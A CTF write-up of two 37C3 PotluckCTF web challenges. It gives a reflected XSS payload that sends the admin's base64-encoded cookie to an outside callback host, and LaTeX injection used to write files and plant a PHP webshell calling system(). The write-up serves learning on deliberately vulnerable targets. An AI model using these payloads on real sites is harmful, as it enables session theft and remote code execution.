My team participated in the 37C3 PotluckCTF and got one challenge, though I personally got painfully close to another one... The following is a writeup/walkthrough of how each flag was grabbed and the thought process for each.

## web/Encoderchef (161 solves)

> I heard Cyberchef is monitored by GCHQ so I am trying to build my own version. It is still under construction so if you see any problems with the site just send a link to the admin and they will have a look :) // (Flag is in admin cookie)

Our site is a converter of text to various formats, like base64, hex, binary, etc.

![Converter](encoderchef_1.png)

We are also given the source code of the page, aswell as an 'admin' page. This 'admin' page has a URL input for the admin to visit.

![Admin URL Visiting Page](encoderchef_2.png)

If we can find an exploit to steal the admin's cookies (as they said in the description). We get the flag!

```php
$output = "Example output";
if ((isset($_GET["input"]) && !is_null($_GET["input"])) && (isset($_GET["encoding"]) && !is_null($_GET["encoding"]))){
	$input = base64_decode($_GET["input"]);

	if($input === false){
		$output = "Invalid input";
	} else {
		switch ($_GET["encoding"]) {
			case "base64":
				$output = base64_encode($input);
				break;
```
A portion of the code catches my eye, specifically the base64 input. If we can put in a base64 input that decodes to HTML tags, we can cause an XSS!

Payload:

```html
</textarea>
<script>
i=document.createElement("img");
i.src="https://******************************.oastify.com?c="+btoa(document.cookie);
document.body.appendChild(i);
</script>
<textarea>
```

Encoding our payload with Base64 and then URL encoding it, and making a final url gives us this: `http://[url]:31337/?encoding=base64&input=[payload]`

And sending it to the admin, sends us back our Base64 encoded cookies with our flag!

Flag: <mark>flag="potluck{uu_make_me_go_crazy}"</mark>

## web/Santify (58 solves)

> I found this shop that claims to provide ""delivery via reindeer sleigh"". I ordered a few things, but the cards did not arrive on time! Please find out what went wrong.<br>Anyway, check out their web page<br>Note: Any accounts named ADMIN, BOT or similar are regular users and not part of the challenge, please ignore them


**I didn't completely solve this challenge during the CTF, but got painfully close...**

The card creation page is the following:

![Card Creation](santify_1.png)

The header text is of key importance, as it mentions `pdflatex`. LaTeX has some interesting capabilities that are listed nicely on [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX Injection).

Injecting some math operation in LaTeX, I try to read a 'flag'...

![LFI Attempt](santify_2.png)

... Fair enough.

I found that we have the capabilites to write files, by doing the following.

```latex
\newwrite\outfile
\openout\outfile=test.log
\write\outfile{test!}
\closeout\outfile
```

Looking at our LaTeX log were given where the files are uploaded, from there we can look at our uploaded file. Cool, now what...

We can't really 'read' the binary as LaTeX isn't very good at handling extended unicode without importing packages, and trying to run the command injection payloads fails as they are using the `-no-shell-escape` flag, which restricts usage of `/write18{cmd}`.

**This part I did not get during the competition.**

What I needed to do was write a PHP webshell, as the website is run on PHP which can be seen in file names in other portions of the site (index.php, send-card.php, render-LaTeX.php, etc.).

```latex
\newwrite\outfile
\openout\outfile=cmd.php
\write\outfile{<?php system("/app/readflag");}
\closeout\outfile
```

Now you visit the endpoint it was uploaded to (`/images/<random guid>/cmd.php`) you will see the flag.

**Files:** None provided :(
